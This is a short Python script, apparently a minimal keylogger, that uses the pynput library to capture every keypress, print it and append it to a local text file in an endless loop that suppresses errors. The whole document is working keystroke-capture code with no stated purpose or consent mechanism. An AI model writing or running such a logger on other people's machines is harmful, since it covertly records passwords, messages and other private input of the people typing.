import os
from pynput import keyboard

def on_press(key):
    try:
        k = key.char
    except:
        k = ""
    print('Key pressed: ' + k)
    with open("textfile.txt", "a") as file:
        file.write(k)

while True:
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()
    except:
        pass
